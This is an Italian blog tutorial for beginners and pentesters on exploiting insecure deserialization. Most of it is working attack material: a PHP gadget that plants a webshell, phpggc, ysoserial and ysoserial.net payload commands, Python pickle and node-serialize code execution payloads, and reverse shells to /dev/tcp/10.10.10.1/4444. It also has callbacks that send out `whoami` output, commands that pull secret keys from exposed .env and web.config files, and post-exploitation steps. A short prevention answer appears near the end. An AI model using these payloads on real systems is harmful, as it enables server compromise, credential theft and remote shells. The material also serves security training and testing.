---
title: 'Deserialization Attack: Cos''è, Come Si Trova e Come Porta a RCE'
slug: deserialization-attack
description: ' Deserialization attack spiegato dall''inizio: cos''è la serializzazione, perché è pericolosa, come si exploita in PHP, Java, Python e .NET con ysoserial e phpggc. Guida passo passo per principianti e pentester.'
image: /deserialization-attack-java-php-python.webp
draft: false
date: 2026-07-01T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - expoit
tags:
  - deserialization attack
  - insecure deserialization
  - ysoserial
---

# Deserialization Attack: Exploit, Bypass e RCE Passo per Passo

La **deserialization insicura** è una delle vulnerabilità più pericolose che esistano nel web. Quando viene exploitata porta quasi sempre a **Remote Code Execution**: l'attaccante esegue comandi sul server come se avesse accesso diretto alla macchina.

Prima di capire l'attacco, devi capire il meccanismo che viene abusato. Partiamo dall'inizio.

***

## Cos'è la Serializzazione (spiegata semplice)

Un programma lavora con oggetti in memoria. Pensa a un oggetto `Utente` con le sue proprietà: nome, email, ruolo, preferenze. Finché il programma gira, quell'oggetto esiste nella RAM. Ma se vuoi salvarlo su disco, mandarlo via rete, o tenerlo in un cookie — la RAM non basta. Devi convertirlo in qualcosa di trasportabile: una stringa o una sequenza di byte.

Questa conversione si chiama **serializzazione**. Il processo inverso — ricostruire l'oggetto da quei byte — si chiama **deserializzazione**.

```
┌─────────────────────────┐           ┌─────────────────────────┐
│  Oggetto in memoria     │           │  Stringa / byte         │
│  Utente {               │──────────▶│  O:6:"Utente":2:{       │
│    nome: "Mario"        │ serialize │    s:4:"nome";s:5:"Mario"│
│    admin: false         │           │    s:5:"admin";b:0;     │
│  }                      │           │  }                      │
└─────────────────────────┘           └─────────────────────────┘
                                               │
                                               │ viaggio in rete / cookie
                                               ▼
┌─────────────────────────┐           ┌─────────────────────────┐
│  Oggetto ricostruito    │◀──────────│  Stringa / byte         │
│  Utente {               │deserialize│  (ricezione)            │
│    nome: "Mario"        │           └─────────────────────────┘
│    admin: false         │
│  }                      │
└─────────────────────────┘
```

Fin qui tutto normale. Il problema nasce quando il server riceve dati serializzati dall'utente e li deserializza **senza controllare che non siano stati manomessi**.

***

## Perché la Deserializzazione È Pericolosa

Quando deserializzi un oggetto, non stai solo leggendo dei dati. Il runtime esegue codice: chiama costruttori, inizializzatori, metodi di pulizia. Tutto questo avviene in automatico, prima ancora che l'applicazione usi l'oggetto.

Se l'attaccante controlla i dati serializzati, controlla cosa succede durante quel processo. Può costruire un oggetto fatto apposta per far eseguire al server un comando di sua scelta — mentre il server pensa di star solo "rileggendo" dei dati.

Immagina di ricevere per posta un pacco. Pensi di aprire una scatola. Ma il pacco è trappola: appena lo apri parte un meccanismo nascosto. Il server "apre il pacco" (deserializza) e il meccanismo parte: `whoami`, `cat /etc/passwd`, oppure una reverse shell.

***

## PHP: il Caso Più Comune nel Web

PHP ha una funzione chiamata `unserialize()` che ricostruisce oggetti da una stringa. Molte applicazioni la usano per salvare sessioni, preferenze utente, dati di cache nei cookie.

### Come Appare un Oggetto PHP Serializzato

```
O:4:"User":2:{s:8:"username";s:5:"mario";s:7:"isAdmin";b:0;}
```

Leggi così, pezzo per pezzo:

```
O        → tipo: Object (oggetto)
:4:      → il nome della classe ha 4 caratteri
"User"   → nome della classe: User
:2:      → l'oggetto ha 2 proprietà
{
  s:8:"username" → proprietà: stringa di 8 caratteri, nome "username"
  s:5:"mario"    → valore: stringa di 5 caratteri, "mario"
  s:7:"isAdmin"  → proprietà: stringa di 7 caratteri, nome "isAdmin"
  b:0            → valore: boolean false (0)
}
```

È testo leggibile. Puoi modificarlo a mano. Se cambi `b:0` in `b:1` e il server usa quella proprietà per decidere se sei amministratore — hai appena ottenuto privilegi admin cambiando un carattere nel cookie.

Ma questo è solo l'inizio. La cosa più pericolosa sono i **magic methods**.

### Magic Methods: Il Meccanismo Che Viene Abusato

In PHP esistono metodi "speciali" che il linguaggio chiama automaticamente in certi momenti — tu non li chiami mai direttamente nel codice, li chiama PHP per te:

```
__wakeup()    → chiamato da PHP appena dopo unserialize()
__destruct()  → chiamato da PHP quando l'oggetto viene eliminato (fine script)
__toString()  → chiamato da PHP se l'oggetto viene usato come stringa
__call()      → chiamato da PHP su metodi che non esistono
```

Il problema: se uno di questi metodi fa qualcosa di pericoloso usando le proprietà dell'oggetto, e quelle proprietà le controlli tu tramite il payload — il gioco è fatto.

### Esempio Passo Passo: da Cookie a Webshell

Immaginiamo che il server abbia questa classe:

```php
class Logger {
    public $logfile = "/var/log/app.log";  // dove scrivere
    public $data    = "";                   // cosa scrivere

    public function __destruct() {
        // PHP chiama questo metodo automaticamente quando lo script finisce
        // Scrive $data nel file $logfile
        file_put_contents($this->logfile, $this->data);
    }
}
```

E il server fa questo con il cookie:

```php
$obj = unserialize($_COOKIE['prefs']);
// Prende il cookie, lo deserializza, e usa l'oggetto
```

Il developer pensava di salvare preferenze innocue. Ma ecco cosa fa l'attaccante:

**Passo 1 — Costruisce un oggetto Logger malevolo:**

```php
<?php
class Logger {
    public $logfile = "/var/www/html/shell.php";          // path della webshell
    public $data    = "<?php system(\$_GET['cmd']); ?>";  // contenuto della webshell
}

// Serializza questo oggetto malevolo
$payload = serialize(new Logger());
echo urlencode($payload);  // URL-encoda per il cookie
```

Output (la stringa che metterà nel cookie):

```
O%3A6%3A%22Logger%22%3A2%3A%7Bs%3A7%3A%22logfile%22%3Bs%3A26%3A...
```

**Passo 2 — Mette il payload nel cookie e manda la request:**

```bash
curl -s "https://target.com/" \
  -H "Cookie: prefs=O%3A6%3A%22Logger%22%3A2%3A%7B..."
```

**Passo 3 — Cosa succede sul server:**

1. Il server riceve il cookie e chiama `unserialize()`
2. PHP ricostruisce l'oggetto `Logger` con i valori dell'attaccante
3. Lo script finisce → PHP chiama automaticamente `__destruct()`
4. `__destruct()` esegue `file_put_contents("/var/www/html/shell.php", "<?php system($_GET['cmd']); ?>")`
5. La webshell è scritta su disco

**Passo 4 — L'attaccante ha RCE:**

```bash
curl "https://target.com/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl "https://target.com/shell.php?cmd=cat+/etc/passwd"
# root:x:0:0:root:/root:/bin/bash
# ...
```

### Come Riconoscere Dati PHP Serializzati nel Traffico

Usa Burp Suite con il proxy attivo e cerca questi pattern nei cookie e nei parametri:

```
O:  → oggetto
a:  → array
s:  → stringa
b:  → boolean
i:  → integer
N;  → null
```

Se i dati sono in base64 (spesso i cookie vengono codificati), decodificali:

```bash
# Decodifica un cookie base64 e controlla se contiene serializzazione PHP
echo "TzozOiJGb28iOjE6e3M6MzoiYmFyIjtzOjM6ImJheiI7fQ==" | base64 -d
# Output: O:3:"Foo":1:{s:3:"bar";s:3:"baz";}
# → Confermato: è un oggetto PHP serializzato
```

### Come Identificare il Framework PHP del Target

Non sempre sai quale framework usa l'applicazione. Questo è importante perché il tool che userai (PHPGGC) ha gadget chain specifiche per framework. Ecco come scoprirlo:

**Dalla error page** — manda una request malformata e leggi lo stack trace:

```bash
curl "https://target.com/pagina-che-non-esiste-12345"
# Se vedi: "Symfony\Component\HttpKernel..." → Symfony
# Se vedi: "Illuminate\Foundation..."        → Laravel
# Se vedi: "Zend_Controller..."              → Zend/Laminas
```

**Dal cookie di sessione:**

```bash
curl -sI "https://target.com/" | grep -i "set-cookie"
# laravel_session=...  → Laravel
# PHPSESSID=...        → PHP generico (guarda la struttura)
```

**Da file esposti:**

```bash
# composer.json mostra tutte le dipendenze del progetto
curl "https://target.com/composer.json"
# {"require": {"laravel/framework": "^10.0"...}} → Laravel

# .env mostra variabili d'ambiente (incluse chiavi segrete!)
curl "https://target.com/.env"
# APP_NAME=Laravel → Laravel
# APP_SECRET=... → Symfony

# phpinfo mostra tutto
curl "https://target.com/phpinfo.php"
curl "https://target.com/info.php"
```

### PHPGGC: Genera il Payload Senza Costruire la Chain a Mano

Una volta identificato il framework, usi PHPGGC per generare il payload. PHPGGC conosce già le gadget chain dei framework più diffusi e le costruisce per te.

```bash
# Installazione
git clone https://github.com/ambionics/phpggc
cd phpggc

# Guarda tutte le gadget chain disponibili
./phpggc -l
# Symfony/RCE1
# Symfony/RCE4
# Symfony/RCE7
# Laravel/RCE1
# Laravel/RCE2
# WordPress/RCE1
# ... e molte altre

# Genera il payload per Symfony (output in base64, pronto per il cookie)
./phpggc Symfony/RCE7 system 'id' -b
# Output: eyJzeW1mb255...  (base64)

# PRIMA di usare RCE, conferma con un callback HTTP/DNS innocuo
# Burp Collaborator ti dà un dominio unico, usa quello
./phpggc Symfony/RCE7 system 'curl http://tuo-collaborator.burpcollaborator.net' -b

# Se Collaborator riceve la request → deserializzazione confermata → ora scala a RCE

# Reverse shell
./phpggc Symfony/RCE7 system \
  'bash -c "bash -i >& /dev/tcp/10.10.10.1/4444 0>&1"' -b

# Quale chain usare? Prova in ordine: RCE1, RCE4, RCE7, RCE8
# Non tutte funzionano — dipende dalla versione del framework
```

### Se il Cookie È Firmato: Serve la Chiave Segreta

Molte applicazioni firmano i cookie per impedire la manomissione. Il payload funziona solo se la firma è valida. Per creare una firma valida hai bisogno della chiave segreta.

Dove cercarla:

```bash
# 1. /phpinfo.php o /info.php → mostra SECRET_KEY come variabile d'ambiente
curl "https://target.com/phpinfo.php" | grep -i "secret\|key\|app_"

# 2. /.env → spesso esposto per errore di configurazione
curl "https://target.com/.env"
# APP_KEY=base64:abc123...  → chiave Laravel
# APP_SECRET=xyz789...      → chiave Symfony

# 3. File di backup dell'editor di testo (aggiunge ~ al nome del file)
curl "https://target.com/.env~"
curl "https://target.com/config/parameters.yml~"

# 4. /web.config (ASP.NET) o /config.php esposto
curl "https://target.com/config.php"
```

Una volta trovata la chiave, firmi il payload:

```bash
# Esempio per Symfony (firma HMAC-SHA256)
php -r "
\$payload = base64_decode('PAYLOAD_DA_PHPGGC');
\$secret = 'chiave_trovata_nel_env';
\$cookie = base64_encode(\$payload) . '.' . hash_hmac('sha256', \$payload, \$secret);
echo \$cookie . PHP_EOL;
"
# Metti il risultato nel cookie e manda la request
```

***

## Java: Il Caso Storicamente Più Grave

Java serializza gli oggetti in formato binario. Questa vulnerabilità ha causato i breach più gravi degli ultimi anni:

* **WebLogic CVE-2015-4852** — RCE senza autenticazione su porta 7001
* **Jenkins CVE-2016-0792** — RCE pre-auth via endpoint `/cli`
* **Apache Struts CVE-2017-9805** — usato nell'Equifax breach (143 milioni di record esposti)

### Come Riconoscere Oggetti Java Serializzati

Gli oggetti Java serializzati iniziano sempre con gli stessi byte:

```
In binario (hex): AC ED 00 05
In base64:        rO0AB...
```

Se in un cookie vedi `rO0AB` — stai guardando un oggetto Java serializzato.

```bash
# Cerca "rO0AB" nei cookie e nei parametri
curl -sI "https://target.com/" | grep -i cookie
# session=rO0ABXNyAA... → oggetto Java serializzato nel cookie!

# Verifica i magic byte
echo "rO0ABXNy..." | base64 -d | xxd | head -2
# 0000: aced 0005  → confermato
```

### Gadget Chain Java: Il Concetto Spiegato Semplice

In Java non puoi eseguire un comando direttamente con la deserializzazione come in PHP. Hai bisogno di una **gadget chain** — una catena di classi.

Pensa così: il server ha installate delle librerie (Apache Commons Collections, Spring, Hibernate). Queste librerie contengono classi con metodi che, in condizioni normali, fanno cose utili. Ma se le concateni in un certo ordine durante la deserializzazione, puoi arrivare a chiamare `Runtime.exec()` — il metodo Java che esegue comandi di sistema.

Ogni anello della catena è una classe già presente nel server (un "gadget"). Tu costruisci la catena nell'ordine giusto, la serializzi, e la mandi al server. Quando il server deserializza, la catena si attiva e alla fine esegue il tuo comando.

```
Oggetto ricevuto dal server
        │
        ▼
Classe A → chiama metodo di Classe B
        │
        ▼
Classe B → chiama metodo di Classe C
        │
        ▼
Classe C → chiama Runtime.exec("id")
        │
        ▼
      RCE ✓
```

Non costruisci la chain a mano — usi `ysoserial`.

### ysoserial: Genera Payload Java

```bash
# Download
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Guarda tutte le gadget chain disponibili
java -jar ysoserial-all.jar 2>&1 | grep "^[A-Z]"
# CommonsCollections1, CommonsCollections2, ..., CommonsCollections7
# Spring1, Spring2, Groovy1, Hibernate1...

# PRIMO PASSO: usa URLDNS per confermare la vulnerabilità
# URLDNS non esegue comandi — fa solo una richiesta DNS
# Non ha dipendenze: funziona su qualsiasi server Java, qualunque versione
# È il modo più sicuro e affidabile per confermare la vuln prima di escalare

java -jar ysoserial-all.jar URLDNS "http://abc123.burpcollaborator.net" > payload_dns.ser

# Manda il payload al server
curl -s "https://target.com/endpoint" \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload_dns.ser

# Se Burp Collaborator riceve una richiesta DNS da abc123.burpcollaborator.net
# → il server ha deserializzato il tuo oggetto → vulnerabilità confermata

# Ora scala a RCE — prova le chain in ordine (CC6 è la più universale)
java -jar ysoserial-all.jar CommonsCollections6 'id' > payload_cc6.ser
java -jar ysoserial-all.jar CommonsCollections1 'id' > payload_cc1.ser
java -jar ysoserial-all.jar Spring1            'id' > payload_spring1.ser

# Conferma con callback HTTP prima di reverse shell
java -jar ysoserial-all.jar CommonsCollections6 \
  'curl http://abc123.burpcollaborator.net/rce-confirmed' > payload_http.ser

# Reverse shell (in ascolto: nc -lvnp 4444)
java -jar ysoserial-all.jar CommonsCollections6 \
  'bash -i >& /dev/tcp/10.10.10.1/4444 0>&1' > shell.ser
```

### Come Scoprire Quali Librerie Sono Nel Server (GadgetProbe)

Il problema: non sai quale gadget chain funziona se non sai quali librerie sono installate. GadgetProbe risolve questo.

GadgetProbe manda payload URLDNS selettivi: ogni payload dice "se la libreria X è presente, fai una richiesta DNS a X.collaborator.com". Dai risultati DNS capisci esattamente il classpath del server.

```bash
# GadgetProbe - https://github.com/BishopFox/GadgetProbe
# Genera un payload per ogni libreria da testare
# Guardi quali query DNS arrivano su Burp Collaborator
# → Sai esattamente quali gadget chain puoi usare
```

### Dove Cercare Oggetti Java Serializzati

```bash
# Cookie
curl -sI "https://target.com/" | grep -i set-cookie | grep "rO0AB"

# Parametri POST (es. endpoint SOAP, RMI, API interne)
# Intercetta con Burp, cerca blob che iniziano con rO0AB o AC ED in hex

# ViewState JSF (JavaServer Faces)
# Cerca <input type="hidden" name="javax.faces.ViewState" value="...">
# Se il valore inizia con rO0AB → serializzazione Java nel ViewState

# Porta 1099 (RMI) e porta 7001 (WebLogic) → spesso espongono endpoint
# di deserializzazione direttamente sulla rete
```

***

## Python: pickle

`pickle` è il modulo di serializzazione di Python. La documentazione stessa dice esplicitamente che non va usato con dati non fidati. Eppure è usato in sessioni Flask, task queue Celery, cache Redis di applicazioni Python.

### Perché pickle È Pericoloso

Quando Python serializza un oggetto con pickle, salva anche le istruzioni su come ricostruirlo. Queste istruzioni vengono eseguite durante la deserializzazione.

Il metodo `__reduce__()` di un oggetto dice a pickle cosa fare. Restituisce una tupla: `(funzione_da_chiamare, argomenti)`. Pickle chiama quella funzione con quegli argomenti durante la deserializzazione.

Se scrivi un oggetto il cui `__reduce__()` restituisce `(os.system, ('id',))` — pickle chiama `os.system('id')` quando deserializza il tuo oggetto.

### Payload Passo per Passo

```python
import pickle
import os
import base64

# Crei una classe con __reduce__ che dice a pickle:
# "quando deserializzi questo oggetto, chiama os.system('id')"
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))
        # ↑ (funzione, (argomento,))
        # pickle chiamerà: os.system('id')

# Serializza l'oggetto malevolo in byte
payload_bytes = pickle.dumps(Exploit())

# Codifica in base64 per inserirlo nel cookie o nel parametro
payload_b64 = base64.b64encode(payload_bytes).decode()
print(payload_b64)
# → Questo è il tuo payload, lo metti nel cookie/parametro
```

Quando il server esegue `pickle.loads(payload_che_hai_mandato)` → `os.system('id')` viene chiamato.

Payload con reverse shell:

```python
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/10.10.10.1/4444 0>&1'"
        return (os.system, (cmd,))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

### Come Riconoscere Dati pickle

```bash
# In base64, Python pickle inizia con:
# gASV  → protocollo 4 (Python 3.8+)
# gAJ   → protocollo 2
# KGRx  → protocollo 0 (leggibile, meno comune)

# Decodifica e ispeziona i magic byte
echo "gASV..." | base64 -d | xxd | head -2
# 8004 → protocollo 4 pickle

# Flask session cookie (formato diverso, ma potrebbe usare pickle internamente)
pip install flask-unsign
flask-unsign --decode --cookie "eyJ1c2VybmFtZSI6Im1hcmlvIn0..."
# Guarda se usa PickleSerializer invece di JSONSerializer
```

***

## .NET: BinaryFormatter e ViewState

Comune in applicazioni ASP.NET legacy. Il vettore principale è spesso il **ViewState** — un campo nascosto nei form HTML che ASP.NET usa per mantenere lo stato della pagina tra una richiesta e l'altra.

```html
<!-- Cerca nei form HTML di applicazioni ASP.NET -->
<input type="hidden" name="__VIEWSTATE" value="AAEC..." />
```

Se il ViewState non ha un MAC (firma HMAC), puoi sostituirlo con un payload malevolo.

```bash
# ysoserial.net (versione .NET, gira su Windows)
# https://github.com/pwntester/ysoserial.net

# Payload per BinaryFormatter
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "whoami" -o base64

# Payload per ViewState (senza MAC)
ysoserial.exe -f ViewState -g TextFormattingRunProperties -c "whoami" \
  --path "/app/login.aspx" --apppath "/"

# Se il ViewState ha il MAC ma hai la machineKey (da web.config):
ysoserial.exe -f ViewState -g TextFormattingRunProperties -c "whoami" \
  --decryptionalg="AES" --decryptionkey="CHIAVE" \
  --validationalg="SHA1" --validationkey="ALTRA_CHIAVE"

# Cerca la machineKey in:
curl "https://target.com/web.config"      # spesso esposto per errore
curl "https://target.com/web.config.bak"  # backup
```

***

## Node.js: node-serialize

Meno diffuso, ma presente in applicazioni Node.js legacy.

```javascript
// La libreria node-serialize è vulnerabile
// Se il valore serializzato contiene una funzione seguita da ()
// node-serialize la esegue durante la deserializzazione

// Il payload: una funzione con () alla fine (IIFE - esecuzione immediata)
var payload = '{"rce":"_$$ND_FUNC$$_function(){\
  require(\'child_process\').exec(\'id\', function(e,s){console.log(s)});\
}()"}';
//                                                           ↑
//                                             questi () fanno eseguire la funzione

var serialize = require('node-serialize');
serialize.unserialize(payload);  // → esegue exec('id')
```

***

## Workflow Completo: Dal Sospetto alla Shell

Questo è il flusso mentale da seguire durante un pentest. Segui i passi in ordine — non saltare alla RCE senza prima confermare la vulnerabilità.

**Passo 1 — Intercetta il traffico**

Apri Burp Suite, attiva il proxy, naviga l'applicazione: login, dashboard, download file, cambio preferenze. Tutto il traffico passa per Burp.

**Passo 2 — Cerca dati serializzati**

Nel Proxy History di Burp, filtra cookie e body delle richieste. Cerca questi pattern:

```
rO0AB         → Java
O: oppure a:  → PHP
gASV          → Python pickle
AAEAAAD       → .NET BinaryFormatter
```

**Passo 3 — Identifica il linguaggio e il framework**

Leggi header, error page, cookie di sessione. Determina: è PHP? Java? Python? E quale framework/librerie usa?

**Passo 4 — Conferma la vulnerabilità con callback innocuo**

Non vai subito a RCE. Prima mandi un payload che fa solo una richiesta DNS verso Burp Collaborator:

```bash
# Java (URLDNS — funziona sempre, zero dipendenze)
java -jar ysoserial-all.jar URLDNS "http://abc123.burpcollaborator.net" > dns.ser

# PHP (curl verso Collaborator)
./phpggc Symfony/RCE7 system 'curl http://abc123.burpcollaborator.net' -b

# Python (richiesta HTTP)
# Nell'oggetto Exploit: return (os.system, ('curl http://abc123.burpcollaborator.net',))
```

Se Collaborator riceve la richiesta → deserializzazione confermata → hai la prova della vulnerabilità senza fare danni.

**Passo 5 — Scala a RCE**

Ora che sai che funziona, mandi il payload con il comando reale:

```bash
# Conferma output
java -jar ysoserial-all.jar CommonsCollections6 \
  'curl http://abc123.burpcollaborator.net/$(whoami)' > rce_confirm.ser
# Se Collaborator riceve /www-data → RCE confermata con utente

# Reverse shell
nc -lvnp 4444  # in ascolto sulla tua macchina
java -jar ysoserial-all.jar CommonsCollections6 \
  'bash -i >& /dev/tcp/10.10.10.1/4444 0>&1' > shell.ser
```

**Passo 6 — Post-exploitation**

```bash
# Chi sei?
whoami && id
# Dove sei?
hostname && ip addr
# Cosa c'è di interessante?
ls /home && ls /var/www && cat /etc/passwd
```

***

## Tool di Riferimento

| Tool                                    | Linguaggio target | Cosa fa                                                        |
| --------------------------------------- | ----------------- | -------------------------------------------------------------- |
| **phpggc**                              | PHP               | Genera gadget chain per Laravel, Symfony, WordPress, Yii...    |
| **ysoserial**                           | Java              | Genera gadget chain per Commons Collections, Spring, Groovy... |
| **ysoserial.net**                       | .NET              | Genera payload per BinaryFormatter, ViewState, LosFormatter    |
| **GadgetProbe**                         | Java              | Scopre quali librerie sono nel classpath del server via DNS    |
| **gadgetinspector**                     | Java              | Analisi statica del classpath per trovare chain custom         |
| **flask-unsign**                        | Python/Flask      | Decodifica e forgia cookie Flask firmati                       |
| Burp BApp: Java Deserialization Scanner | Java              | Test automatico delle gadget chain via Burp                    |

***

## Checklist

```
FASE 1 — IDENTIFICAZIONE
☐ Cookie: rO0AB (Java) / O: a: (PHP) / gASV (Python pickle) / AAEAAAD (.NET)?
☐ Content-Type: application/x-java-serialized-object?
☐ ViewState nei form HTML (ASP.NET)?
☐ Parametri POST con blob binari o base64 anomali?
☐ Error page / stack trace rivela unserialize(), ObjectInputStream, pickle?

FASE 2 — FINGERPRINTING
☐ PHP: composer.json, .env, cookie di sessione, error page con stack trace
   → Quale framework? (Laravel, Symfony, Yii, WordPress, Magento)
☐ Java: porta 7001 (WebLogic), WEB-INF/web.xml, MANIFEST.MF, stack trace
   → Quali librerie? (Commons Collections, Spring, Hibernate, Groovy)
☐ Python: requirements.txt esposto, traceback nel response, cookie Flask
☐ .NET: web.config esposto, __VIEWSTATE nel form, X-Powered-By: ASP.NET

FASE 3 — CERCA CHIAVI SEGRETE (se i dati sono firmati)
☐ /phpinfo.php → variabili d'ambiente
☐ /.env → APP_KEY, APP_SECRET, SECRET_KEY
☐ /web.config → machineKey
☐ File di backup (aggiungi ~ al nome: /.env~, /config.php~)

FASE 4 — CONFERMA OOB (prima di RCE)
☐ Java: ysoserial URLDNS → Collaborator riceve DNS? → vuln confermata
☐ PHP: phpggc + curl → Collaborator riceve HTTP? → vuln confermata
☐ Python: os.system('curl collaborator') → ricevuto? → vuln confermata

FASE 5 — EXPLOITATION
☐ Gadget chain giusta identificata (prova in ordine se hai più opzioni)
☐ Payload RCE (id / whoami) → output confermato
☐ Reverse shell → connessione ricevuta su nc -lvnp 4444

FASE 6 — DOCUMENTAZIONE
☐ Screenshot payload → risposta server (o callback Collaborator)
☐ Screenshot output comando (id, whoami)
☐ Screenshot reverse shell
☐ Endpoint vulnerabile, parametro/cookie coinvolto, linguaggio/framework
```

***

## FAQ

**Non so da dove iniziare. Cosa guardo per primo?**
Apri Burp, naviga l'applicazione normalmente, e poi guarda il Proxy History. Filtra i cookie e i body delle richieste POST. Cerca `rO0AB` per Java, oppure stringhe che decodificate in base64 iniziano con `O:` per PHP. Se non trovi niente in superficie, guarda le error page — spesso rivelano il framework e a volte anche la presenza di deserializzazione.

**Come scelgo quale gadget chain Java usare?**
Prima usa sempre URLDNS per confermare la deserializzazione — non ha dipendenze, funziona su qualsiasi Java. Poi usa GadgetProbe per scoprire le librerie nel classpath. Se non hai GadgetProbe, prova in ordine: CommonsCollections6, CC1, CC3, Spring1, Groovy1.

**Il payload PHP non funziona neanche con phpggc. Perché?**
Tre cause principali: (1) il cookie è firmato e non hai la chiave, (2) il framework è aggiornato e quella gadget chain non esiste più, (3) stai usando la chain sbagliata per quel framework. Prova le chain in ordine (RCE1 → RCE7 → RCE8) e cerca la chiave in .env o phpinfo.

**Come prevengo questa vulnerabilità?**
La vera soluzione è non deserializzare mai dati che arrivano dall'utente. Usa JSON invece di serializzazione nativa. Se devi deserializzare, implementa una whitelist di classi accettabili e non fidarti mai dell'input prima di averlo validato.

**Che severità ha in un report?**
Se porta a RCE: **Critical**, sempre. Se porta solo a privilege escalation senza RCE: **High**. Documenta sempre con il payload usato, l'endpoint, e il comando eseguito come prova (`id`, `whoami`).

***

## Risorse

* [PortSwigger Web Security Academy — Insecure Deserialization](https://portswigger.net/web-security/deserialization) — la risorsa più completa con lab pratici gratuiti
* [ysoserial — Gadget chain Java](https://github.com/frohoff/ysoserial)
* [PHPGGC — Gadget chain PHP](https://github.com/ambionics/phpggc)
* [GadgetProbe — Enumera il classpath Java via DNS](https://github.com/BishopFox/GadgetProbe)
* [ysoserial.net — Payload .NET](https://github.com/pwntester/ysoserial.net)

***

> Un blob base64 nel cookie, Apache Commons Collections nel classpath, un endpoint che deserializza: tre ingredienti per una shell. 
